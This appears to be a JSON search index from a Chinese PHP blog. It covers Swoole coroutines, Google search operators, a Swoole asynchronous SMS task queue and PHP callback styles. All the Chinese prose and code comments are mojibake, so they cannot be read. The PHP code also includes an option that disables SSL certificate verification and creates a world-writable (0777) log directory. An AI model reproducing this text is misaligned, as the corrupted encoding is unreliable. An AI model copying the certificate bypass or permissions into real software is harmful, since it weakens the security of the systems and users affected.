ç›´æ¥å»åšä¸‹ä¸€ä¸ªä»»åŠ¡ï¼šç‚’èœ(åç¨‹åˆ‡æ¢) sleep(8); echo &quot;æ±¤å¥½äº†...&quot; . PHP_EOL; &#x2F;&#x2F; è£…ç›˜ $result[&#39;soup&#39;] &#x3D; &#39;ä¸€é”…æ±¤&#39;; $wg-&gt;done(); &#x2F;&#x2F; æ ‡è®°ä»»åŠ¡å®Œæˆ &#125;); &#x2F;&#x2F; è®°å½•ä¸€ä¸‹ç…®é¥­(è®°å½•ä¸€ä¸ªä»»åŠ¡) $wg-&gt;add(); &#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªç…®é¥­ä»»åŠ¡(å¼€å¯ä¸€ä¸ªæ–°çš„åç¨‹) Coroutine::create(function () use ($wg, &amp;$result) &#123; echo &quot;å¼€å§‹ç…®é¥­...&quot; . PHP_EOL; &#x2F;&#x2F; ç…®é¥­éœ€è¦5åˆ†é’Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ç”¨åœ¨è¿™é‡Œç­‰é¥­ç…®ç†Ÿï¼Œæ”¾åœ¨è¿™é‡Œä¸€ä¼šå†æ¥çœ‹çœ‹å¥½äº†æ²¡æœ‰ &#x2F;&#x2F; æˆ‘ä»¬å…ˆå»ç…²æ±¤(åç¨‹åˆ‡æ¢) sleep(10); echo &quot;é¥­ç†Ÿäº†...&quot; . PHP_EOL; &#x2F;&#x2F; è£…ç›˜ $result[&#39;rice&#39;] &#x3D; &#39;ä¸€é”…ç±³é¥­&#39;; $wg-&gt;done(); &#x2F;&#x2F; æ ‡è®°ä»»åŠ¡å®Œæˆ &#125;); &#x2F;&#x2F; è®°å½•ä¸€ä¸‹ç‚’èœ $wg-&gt;add(); &#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªç‚’èœä»»åŠ¡(å†å¼€å¯ä¸€ä¸ªæ–°çš„åç¨‹) Coroutine::create(function () use ($wg, &amp;$result) &#123; &#x2F;&#x2F; ç…é±¼çš„è¿‡ç¨‹å¿…é¡»æ”¾åœ¨ä¸€ä¸ªåç¨‹é‡Œé¢æ‰§è¡Œï¼Œå¦‚æœä¸æ˜¯çš„è¯å¯èƒ½é±¼è¿˜æ²¡ç…å¥½å°±å‡ºé”…äº† &#x2F;&#x2F; å› ä¸ºå¼€å¯åç¨‹åï¼ŒIOå…¨æ˜¯å¼‚æ­¥äº†ï¼Œåœ¨æ­¤demoä¸­æ¯æ¬¡é‡åˆ°sleepéƒ½ä¼šæŒ‚èµ·å½“å‰åç¨‹ &#x2F;&#x2F; åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªåç¨‹æ‰§è¡Œã€‚ &#x2F;&#x2F; ä¾‹å¦‚æŠŠå‡ºé”…è¿™ä¸€æ­¥å¼€å¯ä¸€ä¸ªæ–°åç¨‹æ‰§è¡Œï¼Œåˆ™åœ¨ç…é±¼çš„æ—¶å€™é±¼ï¼Œé±¼å°±å‡ºé”…äº†ã€‚ echo &quot;æ”¾æ²¹...&quot; . PHP_EOL; sleep(1); echo &quot;ç…é±¼...&quot; . PHP_EOL; sleep(3); echo &quot;æ”¾ç›...&quot; . PHP_EOL; sleep(1); echo &quot;å‡ºé”…...&quot; . PHP_EOL; &#x2F;&#x2F; è£…ç›˜ $result[&#39;food&#39;] &#x3D; &#39;é±¼é¦™è‚‰ä¸&#39;; $wg-&gt;done(); &#125;); &#x2F;&#x2F; ç­‰å¾…å…¨éƒ¨ä»»åŠ¡å®Œæˆ $wg-&gt;wait(); &#x2F;&#x2F; è¿”å›æ•°æ®(ä¸Šèœï¼) var_dump($result); &#125;); var_dump(&#39;æ€»è€—æ—¶ï¼š&#39; . (time() - $startTime) . &#39; åˆ†é’Ÿ&#39;); &#125;&#125;$cooker &#x3D; new Cook();$cooker-&gt;cookByCo(); é€šè¿‡æ‰§è¡Œä»£ç å¯ä»¥çœ‹åˆ°åç¨‹æ–¹å¼æ¯”ä¼ ç»Ÿé˜»å¡æ–¹å¼è¶³è¶³å¿«äº†åä¸‰åˆ†é’Ÿã€‚ä»åç¨‹æ–¹å¼å®ç°çš„é€»è¾‘ä¸­å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡æ— æ„ŸçŸ¥ç¼–å†™â€åŒæ­¥ä»£ç â€œï¼Œå´å®ç°äº†å¼‚æ­¥ I/O çš„æ•ˆæœå’Œæ€§èƒ½ã€‚é¿å…äº†ä¼ ç»Ÿå¼‚æ­¥å›è°ƒæ‰€å¸¦æ¥çš„ç¦»æ•£çš„ä»£ç é€»è¾‘å’Œé™·å…¥å¤šå±‚å›è°ƒä¸­å¯¼è‡´ä»£ç æ— æ³•ç»´æŠ¤ã€‚ ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ä¼ ç»Ÿå›è°ƒçš„è§¦å‘æ¡ä»¶æ˜¯å›è°ƒå‡½æ•°ï¼Œè€Œåç¨‹åˆ‡æ¢çš„æ¡ä»¶æ˜¯é‡åˆ° I/Oã€‚ åç¨‹è¯¯åŒºå®é™…ä½¿ç”¨åç¨‹æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ä¸ªè¯¯åŒºï¼Œå¦åˆ™æ•ˆæœå¯èƒ½ä¼šäº‹å€åŠŸåŠã€‚ ç†è®ºä¸Šæ¥è®²ï¼Œåç¨‹è§£å†³çš„æ˜¯ I/O å¤ç”¨çš„é—®é¢˜ï¼Œå¯¹äºè®¡ç®—å¯†é›†çš„é—®é¢˜æ— æ•ˆã€‚ å¦‚æœcpuå¾ˆé—²(å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ¶ˆè€—åœ¨ç½‘ç»œç£ç›˜ä¸Šäº†)ï¼Œåç¨‹å°±å¯ä»¥æé«˜cpuçš„åˆ©ç”¨ç‡ å¦‚æœcpuæœ¬èº«å°±å¾ˆé¥±å’Œäº† ç”¨åç¨‹åè€Œä¼šé™ä½cpuåˆ©ç”¨ç‡ï¼ˆéœ€è¦èŠ±æ—¶é—´æ¥åšåç¨‹è°ƒåº¦ï¼‰ã€‚ swoole æ˜¯å•çº¿ç¨‹ å‚è€ƒé“¾æ¥ swoole å­¦ä¹ ç¬”è®°-åšä¸€é¡¿é¥­æ¥ç†è§£åç¨‹ åç¨‹-EasySwoole swoole åç¨‹-swoole é«˜æ‰‹ä¹‹è·¯ swooleä¸€ä¸ªåç¨‹é—®é¢˜ï¼Ÿä¸ºä»€ä¹ˆæ•ˆç‡å˜æ…¢äº†","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"å¦‚ä½•é«˜æ•ˆçš„åˆ©ç”¨è°·æ­Œæœç´¢å¼•æ“","slug":"how-to-use-google-search-engine-efficiently","date":"2020-11-28T09:03:14.000Z","updated":"2020-11-28T09:04:27.083Z","comments":true,"path":"how-to-use-google-search-engine-efficiently/","link":"","permalink":"https://www.0x2beace.com/how-to-use-google-search-engine-efficiently/","excerpt":"æ•´ç†è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†é‚£äº›ä¸å¤ªå¸¸ç”¨ä½†åˆååˆ†æœ‰ç”¨çš„Google æœç´¢å¼•æ“æœç´¢æŠ€å·§ã€‚","text":"æ•´ç†è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†é‚£äº›ä¸å¤ªå¸¸ç”¨ä½†åˆååˆ†æœ‰ç”¨çš„Google æœç´¢å¼•æ“æœç´¢æŠ€å·§ã€‚ æœç´¢å®Œå…¨åŒ¹é…çš„æœç´¢ç»“æœæœ‰æ—¶å€™æˆ‘ä»¬ä¼šæœ‰è¿™æ ·ä¸€ç§éœ€æ±‚ï¼šæˆ‘éœ€è¦æŸ¥æ‰¾æŸä¸ªå…³é”®å­—åŒæ—¶å‡ºç°çš„å†…å®¹ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°å®Œå…¨åŒ¹é…è¿™æ‹›äº†ã€‚ åœ¨å…³é”®å­—çš„å·¦å³ä¸¤è¾¹åˆ†åˆ«åŠ ä¸Š&quot;è‹±æ–‡çŠ¶æ€çš„åŒå¼•å·ï¼Œå¦‚ï¼š 1&quot;HHKB æ˜¯ä»€ä¹ˆ&quot; ä»æœç´¢ç»“æœä¸­æ’é™¤ç‰¹å®šè¯ä¸ºäº†è¿›ä¸€æ­¥ç­›é€‰æœç´¢ç»“æœï¼Œè¿˜éœ€è¦å­¦ä¼šå¦ä¸€æ‹›ï¼Œåˆ©ç”¨-å‡å·æ’é™¤ç‰¹å®šå…³é”®å­—ï¼š 1&quot;the most important benefit of education&quot;-&quot;unitedstates&quot; ä¸Šé¢è¿™æ®µè¡¨ç¤ºçš„æ„æ€æ˜¯ï¼šè¦æ±‚Google è¿”å›å«æœ‰â€the most important benefit of educationâ€ ä½†ä¸å­˜åœ¨â€unitedstatesâ€çš„å†…å®¹ã€‚ 1daddy -film daddy çš„æ„æ€æ˜¯çˆ¶äº²ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€éƒ¨ç”µå½±ï¼Œå½“ä½ æœç´¢â€daddyâ€ æ—¶ï¼Œè°·æ­Œåªè¿”å›æœ‰å…³ç”µå½±çš„å†…å®¹ã€‚å¦‚æœä½ åªæƒ³æœç´¢æ—¶å…³äºçˆ¶äº²ï¼Œè¦æ’é™¤ç”µå½±ï¼Œåœ¨éœ€è¦æ’é™¤çš„å‰é¢åŠ ä¸Š-ï¼Œä¾‹å¦‚ä¸Šé¢æ‰€ç¤ºã€‚ä½ ä¼šå‘ç°ç»“æœä¸­æ²¡æœ‰ä¸ç”µå½±æœ‰å…³çš„å†…å®¹ã€‚ æœç´¢é€šé…ç¬¦æˆ–æœªçŸ¥å­—è¯æ€æ ·ç”¨ï¼Ÿ å³æœç´¢å­—ç¬¦ä¸²ä¸­å¯ä»¥åŒ…å«æ˜Ÿå·*ï¼Œç”¨æ˜Ÿå·æ¥æ›¿ä»£ä»»æ„å­—ç¬¦ä¸²ã€‚ 1powerful*life æœç´¢ç¤¾äº¤åª’ä½“å½“ä½ åªæƒ³åœ¨æŸä¸ªç¤¾äº¤åª’ä½“é‡Œæ‰¾åˆ°ç›¸å…³å­—è¯æ—¶ï¼Œåœ¨ç”¨äºæœç´¢ç¤¾äº¤åª’ä½“çš„å­—è¯å‰åŠ ä¸Š@ï¼Œä¾‹å¦‚ï¼š 1@twice ç»„åˆæœç´¢åœ¨å„ä¸ªæœç´¢æŸ¥è¯¢å­—é—´åŠ ä¸Šâ€œORâ€å…³é”®å­—ï¼Œä¾‹å¦‚ï¼š 1race OR marathon æœç´¢åˆ°çš„ç»“æœä¼šè¿”å›å…³äº race æˆ–è€… marathonï¼Œæˆ–ä¸¤è€…å‡æœ‰çš„ç›¸å…³å†…å®¹ã€‚ æœç´¢ç‰¹å®šä»·æ ¼ç”¨è¿™ä¸ªæ–¹æ³•æ¥æœç´¢ç‰¹å®šä»·æ ¼çš„å•†å“ï¼Œä¾‹å¦‚æƒ³è¦æœç´¢ä»·æ ¼ä¸º$200çš„ä¹¦åŒ…ï¼Œå¯ä»¥è¿™æ ·æœç´¢ï¼š 1$200 bag åœ¨æŸä¸ªæ•°å­—èŒƒå›´å†…æ‰§è¡Œæœç´¢æ¯”å¦‚æƒ³è¦æœç´¢ä»‹äº $100 - $200 ä¹‹é—´çš„å•†å“ï¼Œæˆ–è€…æ˜¯ 10kg - 20kg çš„æŸç§ä¸œè¥¿ï¼Œäº¦æˆ–è€…æ˜¯ 1900 - 1945 å¹´å‘ç”Ÿçš„äº‹æƒ…ï¼Œç­‰ç­‰ã€‚ åœ¨ä¸¤ä¸ªæ•°å­—ä¹‹é—´åŠ ä¸Š..ç¬¦å·ï¼Œä¾‹å¦‚æœç´¢ä»·æ ¼ $50 - $100 çš„æ¡Œå­ï¼š 1amazon table $50..$100 æœç´¢ç‰¹å®šç½‘ç«™åªåœ¨ç‰¹å®šçš„ç½‘ç«™é‡Œæœç´¢ç›¸å…³èµ„æ–™ï¼Œåœ¨ç›¸åº”çš„åŸŸåå‰é¢åŠ ä¸Š&quot;site:&quot;ï¼Œä¾‹å¦‚è¦åœ¨ youtube é‡Œæ‰¾å…³äºçŒ«çš„ç”µå½±ï¼Œå¯ä»¥è¿™æ ·æœç´¢ï¼š 1site:youtube.com cat æœç´¢ç›¸å…³ç½‘ç«™æƒ³æ‰¾å’ŒæŸä¸ªç½‘ç«™æœ‰å…³ç³»æˆ–è€…ç›¸ä¼¼ç‰¹è´¨çš„ç½‘ç«™ï¼Œåœ¨å·²çŸ¥ç½‘å€å‰é¢åŠ ä¸Šrelated:ï¼Œä¾‹å¦‚ï¼š 1related:google.com google.com æ˜¯ä¸€ä¸ªæœç´¢ç½‘ç«™ï¼ŒåŠ ä¸Šrelated:å…³é”®å­—ä¹‹åï¼Œæœç´¢çš„ç»“æœæ˜¯å…¶ä»–æœç´¢å¼•æ“ï¼Œå¦‚ Yahooã€Bing ç­‰ å¯»æ‰¾ä¸»é¢˜æ ‡è®°åœ¨å…³é”®å­—å‰é¢åŠ ä¸Š#ç¬¦å·ï¼Œ è·å–ç½‘ç«™çš„ç›¸å…³èµ„æ–™å¦‚æœä½ æƒ³çŸ¥é“æŸä¸ªç½‘ç«™æ˜¯å…³äºä»€ä¹ˆçš„ï¼Œå¯ä»¥è¿™æ ·å­æœç´¢ï¼š 1info:baidu.com å¤šç»„åˆè¿ç”¨ åœ¨ channelnewsasia.com ç½‘ç«™é‡Œæœç´¢å…³äºå¤©ç¾çš„æ„å¤–ï¼Œé™¤äº†åœ°éœ‡ï¼Œå‘ç”Ÿåœ¨2012å¹´åˆ°2016å¹´ä¹‹é—´ã€‚ 1site:channelnewsasia.com ~accident &quot;natural disaster&quot; -earthquake 2012..2016 å…¶ä¸­æ³¢æµªç¬¦å·~è¡¨ç¤ºä¹Ÿæœç´¢å’Œè¿™ä¸ªå­—æœ‰å…³è”çš„å†…å®¹ï¼Œå¦‚ failureï¼Œcrashã€mishap ç­‰ ä»ä¸¤ä¸ªè´­ç‰©ç½‘ç«™æœç´¢æ‰‹è¡¨ï¼Œä»·æ ¼åœ¨ $100 åˆ° $200 ä¹‹é—´ 1site:shopee.com.my OR site:amazon.com watch $100..$200 ä»ebay ä¸ amazonç½‘ç«™æœç´¢è‹¹æœä¸å¾®è½¯çš„äº§å“ï¼Œæ’é™¤å¹³æ¿ç”µè„‘ 1site:ebay.com OR site:amazon.com apple OR microsoft -tablet åœ¨å‰éš†å¡ä¸€å¸¦æœç´¢ä½æ”¶è´¹ä½å®¿ï¼Œä»·æ ¼åœ¨$100 åˆ° $200 ä¹‹é—´ï¼Œæ’é™¤ airbnbï¼Œé è¿‘è½»å¿«åœ°é“ 1KL ~budget~accommodation $100..$200 -airbnb &quot;nearby LRT station&quot;","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Google Search","slug":"Google-Search","permalink":"https://www.0x2beace.com/tags/Google-Search/"}]},{"title":"PHP + Swoole å®ç°å¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—","slug":"php-swoole-to-achieve-asynchronous-task-queue","date":"2020-11-26T12:33:48.000Z","updated":"2020-11-27T13:54:36.939Z","comments":true,"path":"php-swoole-to-achieve-asynchronous-task-queue/","link":"","permalink":"https://www.0x2beace.com/php-swoole-to-achieve-asynchronous-task-queue/","excerpt":"æœ€è¿‘æ¥æ‰‹ä¸€ä¸ªå¯¹æ¥çŸ­ä¿¡çš„éœ€æ±‚ï¼Œè¿™ä¸ªéœ€æ±‚æœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆéš¾åº¦ï¼Œç›´æ¥æŒ‰ç…§æœåŠ¡å•†çš„è¦æ±‚è¯·æ±‚å…·ä½“çš„æ¥å£å°±å¥½äº†ã€‚","text":"æœ€è¿‘æ¥æ‰‹ä¸€ä¸ªå¯¹æ¥çŸ­ä¿¡çš„éœ€æ±‚ï¼Œè¿™ä¸ªéœ€æ±‚æœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆéš¾åº¦ï¼Œç›´æ¥æŒ‰ç…§æœåŠ¡å•†çš„è¦æ±‚è¯·æ±‚å…·ä½“çš„æ¥å£å°±å¥½äº†ã€‚ æœ€å¼€å§‹æ˜¯ä½¿ç”¨ä¼ ç»Ÿçš„åŒæ­¥é˜»å¡æ–¹å¼å®ç°äº†ä¸€éï¼Œç”¨æˆ·ä½“éªŒå¹¶ä¸å¥½ï¼Œå‘é€çŸ­ä¿¡éœ€è¦ç­‰å¾…ï¼Œç­‰å¾…æœåŠ¡å•†çš„æ¥å£è¿”å›å†…å®¹ï¼Œæ‰ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚ å› ä¸ºæœ€è¿‘åœ¨å­¦ä¹ Swooleï¼ŒSwoole ä¸­æœ‰ä¸€ä¸ªâ€œå¼‚æ­¥ä»»åŠ¡â€ï¼Œå°±ç‰¹åˆ«é€‚åˆä»¥ä¸‹åº”ç”¨åœºæ™¯ï¼š éœ€è¦æ‰§è¡Œè€—æ—¶æ“ä½œï¼Œä¼šé˜»å¡ä¸»è¿›ç¨‹ ç”¨æˆ·ä¸éœ€è¦ç­‰å¾…è¿”å›ç»“æœ ç»“åˆå®˜ç½‘æ‰‹å†Œå’ŒLatent çš„åŸºäº swoole ä¸‹ å¼‚æ­¥æ¶ˆæ¯é˜Ÿåˆ— APIï¼Œæœ€ç»ˆç®€å•å°è£…äº†ä¸€ä¸ªå¤„ç†API çš„ç±»ï¼Œå®ç°å¦‚ä¸‹ï¼š æœåŠ¡ç«¯æœåŠ¡ç«¯æ˜¯åŸºäºæœ¬åœ°Tcpï¼Œç›‘å¬9501ç«¯å£ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162&lt;?phpclass taskServer&#123; const HOST &#x3D; &quot;127.0.0.1&quot;; const PORT &#x3D; 9501; public $server &#x3D; null; public function __construct() &#123; $this-&gt;server &#x3D; new SWoole\\Server(self::HOST, self::PORT); $this-&gt;server-&gt;set(array( &quot;enable_coroutine&quot; &#x3D;&gt; false, &#x2F;&#x2F; å…³é—­åç¨‹ &quot;worker_num&quot; &#x3D;&gt; 2, &#x2F;&#x2F; å¼€å¯çš„è¿›ç¨‹æ•° ä¸€èˆ¬ä¸ºcupæ ¸æ•° 1-4 å€ &quot;task_worker_num&quot; &#x3D;&gt; 2, &#x2F;&#x2F; taskè¿›ç¨‹çš„æ•°é‡ &#39;daemonize&#39; &#x3D;&gt; true, &#x2F;&#x2F; ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼å¯åŠ¨ )); &#x2F;&#x2F; æ³¨å†Œäº‹ä»¶ $this-&gt;server-&gt;on(&quot;connect&quot;, [$this, &quot;onConnect&quot;]); $this-&gt;server-&gt;on(&quot;receive&quot;, [$this, &quot;onReceive&quot;]); $this-&gt;server-&gt;on(&quot;close&quot;, [$this, &quot;onClose&quot;]); $this-&gt;server-&gt;on(&quot;task&quot;, [$this, &quot;onTask&quot;]); $this-&gt;server-&gt;on(&quot;finish&quot;, [$this, &quot;onFinish&quot;]); &#x2F;&#x2F; å¯ç”¨æœåŠ¡ $this-&gt;server-&gt;start(); &#125; &#x2F;** * ç›‘å¬è¿æ¥äº‹ä»¶ * @param $server * @param $fd *&#x2F; public function onConnect($server, $fd)&#123; echo &quot;è¿æ¥æˆåŠŸ&quot;.PHP_EOL; &#125; &#x2F;** * ç›‘å¬å®¢æˆ·ç«¯å‘é€çš„æ¶ˆæ¯ * @param $server &quot;Server å¯¹è±¡&quot; * @param $fd &quot;å”¯ä¸€æ ‡ç¤º&quot; * @param $form_id * @param $data &quot;å®¢æˆ·ç«¯å‘é€çš„æ•°æ®&quot; *&#x2F; public function onReceive($server, $fd, $form_id, $data)&#123; &#x2F;&#x2F; æŠ•é€’ä»»åŠ¡ $server-&gt;task($data); $server-&gt;send($fd, &quot;è¿™æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€çš„ä¿¡æ¯ï¼š&#123;$data&#125;&quot;); &#125; &#x2F;** * ç›‘å¬å¼‚æ­¥ä»»åŠ¡taskäº‹ä»¶ * @param $server * @param $task_id * @param $worker_id * @param $data * @return string *&#x2F; public function onTask($server, $task_id, $worker_id, $data)&#123; $data &#x3D; json_decode($data, true); echo &quot;å¼€å§‹æ‰§è¡Œå¼‚æ­¥ä»»åŠ¡&quot;.PHP_EOL; try &#123; &#x2F;&#x2F; å¼€å§‹æ‰§è¡Œä»»åŠ¡ $this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;å¼€å§‹æ‰§è¡Œä»»åŠ¡&quot;.PHP_EOL ); &#x2F;&#x2F; é€šçŸ¥workerï¼ˆå¿…é¡» returnï¼Œå¦åˆ™ä¸ä¼šè°ƒç”¨ onFinishï¼‰ return $this-&gt;curl($data[&#39;url&#39;], $data[&#39;data&#39;], $data[&#39;type&#39;]); &#125; catch (Exception $exception) &#123; &#x2F;&#x2F; æ‰§è¡Œä»»åŠ¡å¤±è´¥ $this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;æ‰§è¡Œä»»åŠ¡å¤±è´¥&quot;.PHP_EOL); &#125; &#125; &#x2F;** * ç›‘å¬finish äº‹ä»¶ * @param $server * @param $task_id * @param $data *&#x2F; public function onFinish($server, $task_id, $data)&#123; $this-&gt;addLog(date(&quot;Y-m-d H:i:s&quot;).&quot;å¼‚æ­¥ä»»åŠ¡æ‰§è¡Œå®Œæˆ&quot;.PHP_EOL); print_r( &quot;æ¥è‡ªæœåŠ¡ç«¯çš„æ¶ˆæ¯ï¼š&#123;$data&#125;&quot;); &#125; &#x2F;** * ç›‘å¬å…³é—­è¿æ¥äº‹ä»¶ * @param $server * @param $fd *&#x2F; public function onClose($server, $fd)&#123; echo &quot;å…³é—­TCP è¿æ¥&quot;.PHP_EOL; &#125; &#x2F;** * å‘èµ·Get æˆ– Post è¯·æ±‚ * @param string $url è¯·æ±‚åœ°å€ * @param array $request_data è¯·æ±‚å‚æ•° * @param string $request_type è¯·æ±‚ç±»å‹ * @param array $headers å¤´ä¿¡æ¯ * @param bool $is_ssl æ˜¯å¦æ˜¯ssl * @return bool|string *&#x2F; public function curl($url &#x3D; &#39;&#39;, $request_data &#x3D; [], $request_type &#x3D; &#39;get&#39;, $headers &#x3D; [], $is_ssl &#x3D; false) &#123; $curl &#x3D; curl_init (); &#x2F;&#x2F; åˆå§‹åŒ– &#x2F;&#x2F; è®¾ç½® URL curl_setopt($curl, CURLOPT_URL, $url); &#x2F;&#x2F; ä¸è¿”å› Response å¤´éƒ¨ä¿¡æ¯ curl_setopt ( $curl, CURLOPT_HEADER, 0 ); &#x2F;&#x2F; å¦‚æœæˆåŠŸåªå°†ç»“æœè¿”å›ï¼Œä¸è‡ªåŠ¨è¾“å‡ºä»»ä½•å†…å®¹ curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 ); &#x2F;&#x2F; è®¾ç½®è¯·æ±‚å‚æ•° curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query($request_data)); &#x2F;&#x2F; TRUE æ—¶è¿½è¸ªå¥æŸ„çš„è¯·æ±‚å­—ç¬¦ä¸² curl_setopt($curl, CURLINFO_HEADER_OUT, true); &#x2F;&#x2F; Post ç±»å‹å¢åŠ ä»¥ä¸‹å¤„ç† if( $request_type &#x3D;&#x3D; &#39;post&#39;) &#123; &#x2F;&#x2F; è®¾ç½®ä¸ºPOSTæ–¹å¼ curl_setopt ( $curl, CURLOPT_POST, 1 ); &#x2F;&#x2F; è®¾ç½®å¤´ä¿¡æ¯ curl_setopt($curl, CURLOPT_HTTPHEADER, array(&#39;Content-Type: application&#x2F;json&#39;, &#39;Content-Length:&#39; . strlen(json_encode($request_data)))); &#x2F;&#x2F; è®¾ç½®è¯·æ±‚å‚æ•° curl_setopt ( $curl, CURLOPT_POSTFIELDS, json_encode($request_data)); &#x2F;&#x2F; å½“POST æ•°æ®å¤§äº1024 æ—¶å¼ºåˆ¶æ‰§è¡Œ curl_setopt ( $curl, CURLOPT_HTTPHEADER, array(&quot;Expect:&quot;)); &#125; &#x2F;&#x2F; åˆ¤æ–­æ˜¯å¦ç»•è¿‡è¯ä¹¦ if( $is_ssl ) &#123; &#x2F;&#x2F;ç»•è¿‡ssléªŒè¯ curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); &#125; if(!empty($headers)) curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); &#x2F;&#x2F; æ‰§è¡Œ $result &#x3D; curl_exec ( $curl ); if ( $result &#x3D;&#x3D; FALSE) return false; &#x2F;&#x2F; å…³é—­èµ„æº curl_close ( $curl ); return $result; &#125; &#x2F;** * å†™å…¥æ—¥å¿— * @param $content *&#x2F; public function addLog($content)&#123; $path &#x3D; dirname(__FILE__).&quot;&#x2F;logs&#x2F;&quot;; if (!is_dir($path)) mkdir($path,0777,true); $file_name &#x3D; $path.date(&quot;Y_m_d&quot;) . &quot;.log&quot;; if (!file_exists($file_name)) &#123; touch($file_name); chown($file_name, &quot;root&quot;); &#125; $file_log &#x3D; fopen($file_name, &quot;a&quot;); fputs($file_log, $content); fclose($file_log); &#125;&#125;$server &#x3D; new taskServer(); å®¢æˆ·ç«¯è¿™é‡Œçš„å®¢æˆ·ç«¯å¯ä»¥æ˜¯ cli è„šæœ¬ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹åº”æ§åˆ¶å™¨ä¸­çš„å…·ä½“æ–¹æ³•ï¼Œåªè¦èƒ½è¿æ¥Swoole ç›‘å¬çš„Tcp å°±è¡Œã€‚ 12345678910111213141516171819202122232425&lt;?phpnamespace app\\admin\\controller;class Index extends Base&#123; public function index()&#123; $client &#x3D; new \\Swoole\\Client(SWOOLE_SOCK_TCP); if (!$client-&gt;connect(&#39;0.0.0.0&#39;, 9501)) &#123; return json(&quot;connect failed. Error: &#123;$client-&gt;errCode&#125;\\n&quot;); &#125; $data &#x3D; [ &quot;url&quot; &#x3D;&gt; &quot;https:&#x2F;&#x2F;api.paasoo.com&#x2F;json&quot;, &quot;data&quot; &#x3D;&gt; [ &quot;key&quot; &#x3D;&gt; &quot;key&quot;, &quot;secret&quot; &#x3D;&gt; &quot;secret&quot;, &quot;from&quot; &#x3D;&gt; &quot;sms&quot;, &quot;to&quot; &#x3D;&gt; &quot;mobile_phone&quot;, &quot;text&quot; &#x3D;&gt; &quot;test&quot;, ], &quot;type&quot; &#x3D;&gt; &quot;get&quot; ]; $client-&gt;send(json_encode($data)); return json($client-&gt;recv()); &#125;&#125; å‚è€ƒé“¾æ¥ phpä½¿ç”¨Swooleæ¥å®ç°å®æ—¶å¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ— åŸºäº swoole ä¸‹ å¼‚æ­¥æ¶ˆæ¯é˜Ÿåˆ— API","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"PHP çš„å››ç§è®¾ç½®å›è°ƒå‡½æ•°çš„æ–¹å¼","slug":"php-s-four-ways-to-set-callback-functions","date":"2020-11-25T14:18:04.000Z","updated":"2020-11-25T14:19:29.255Z","comments":true,"path":"php-s-four-ways-to-set-callback-functions/","link":"","permalink":"https://www.0x2beace.com/php-s-four-ways-to-set-callback-functions/","excerpt":"æœ€è¿‘åœ¨å­¦ä¹ Swooleï¼Œé¡ºæ‰‹æ•´ç†ä¸€ä¸‹PHP ä¸­çš„å››ç§è®¾ç½®å›è°ƒå‡½æ•°çš„æ–¹å¼ã€‚","text":"æœ€è¿‘åœ¨å­¦ä¹ Swooleï¼Œé¡ºæ‰‹æ•´ç†ä¸€ä¸‹PHP ä¸­çš„å››ç§è®¾ç½®å›è°ƒå‡½æ•°çš„æ–¹å¼ã€‚ åŒ¿åå‡½æ•°1234&lt;?php$server-&gt;on(&quot;request&quot;, function($request, $respone)&#123; echo &quot;Http Server&quot;;&#125;); ç±»é™æ€å‡½æ•°1234567class A&#123; static function onConnect($server, $fd)&#123; echo &quot;UDP Server&quot;; &#125;&#125;$server-&gt;on(&quot;connect&quot;, &quot;A::onConnect&quot;);$server-&gt;on(&quot;conncet&quot;, [&quot;A&quot;, &quot;onConnect&quot;]); å‡½æ•°12345$server-&gt;on(&quot;connect&quot;, &quot;callBack&quot;);function callBack($server, $fd)&#123; echo &quot;Tcp Server&quot;;&#125; å¯¹è±¡æ–¹æ³•12345678910111213141516171819# æƒ…æ™¯ä¸€Class A&#123; public function __construct()&#123; $this-&gt;server-&gt;on(&quot;open&quot;, [$this, &quot;onOpen&quot;]); &#125; public function onOpen($server, $request)&#123; echo &quot;WebSocket Server&quot;; &#125;&#125;# æƒ…æ™¯äºŒClass A&#123; function onOpen($request, $respone)&#123; echo &quot;WebSocket Server&quot;; &#125;&#125;$obj &#x3D; new 